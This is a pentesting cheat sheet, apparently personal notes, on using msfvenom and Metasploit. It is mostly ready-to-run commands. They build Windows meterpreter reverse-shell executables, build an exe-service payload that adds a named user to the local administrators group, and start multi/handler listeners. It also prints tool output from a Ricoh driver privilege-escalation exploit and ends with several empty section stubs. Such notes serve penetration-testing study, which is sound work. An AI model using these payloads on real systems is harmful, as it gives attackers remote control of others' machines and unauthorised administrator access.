- [Syntax](#syntax)
- [32 bit](#32-bit)

# [Syntax](#syntax-1)
(not case sensitive, variable can be used for LHOST)
```sh
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<port> -f <FORMAT> -o <OUTPUT>
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<port> -f <FORMAT> -e <ENCODER> -i <ENCODE COUNT> -o <OUTPUT>
```

## [32 bit](#32-bit-1)
```sh
myip=127.0.0.1
port=3232
msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=$port -f exe -o rev3232.exe
```
```sh
msfvenom -p windows/exec CMD='net localgroup administrators {user} /add' -f exe-service -o {p4yl04d.exe}
msfvenom -p windows/exec CMD='net localgroup administrators bitbucket /add' -f exe-service -o Zero.exe
```
### Capture 32 vs 64 bit (exploit/multi/handler) in One Liner
https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
```sh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $myip;set LPORT $port;run;"
```

### Capture 32 vs 64 bit (exploit/multi/handler)
```sh
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

# or

set payload windows/x64/meterpreter/reverse_tcp
```

### Examples 
```sh
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > grep yes options
   LHOST                   yes       The listen address (an interface may be specified)                                              
   LPORT  4444             yes       The listen port
```

### list all payloads
```
msfvenom -l payloads
```

## Common Mistake

### The payload should use the same architecture as the target driver
```sh
msf6 exploit(windows/local/ricoh_driver_privesc) > run 

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ricoh_driver_privesc) >
```

## 
```sh
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Error: The selected arch is incompatible with the payload
```

## 
```sh
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$myip lport=6464 -a x64 -f exe -o r64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: r64.exe
```

## 
```sh
$ file r*     
r32.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections
r64.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```

### Options:
```sh
-l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all

-p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
   --list-options               List --payload <value>'s standard, advanced and evasion options

-f, --format          <format>   Output format (use --list formats to list)
```

### list format; -lf or -l -f or --list format (if you like to type)
```sh
$ msfvenom -lf

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs                                                                                                                         
    macho                                                                                                                            
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    masm
    nim
    nimlang
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript
```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

# References

[MSFVenom - CheatSheet
 by hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)

[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter by infinitelogins)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
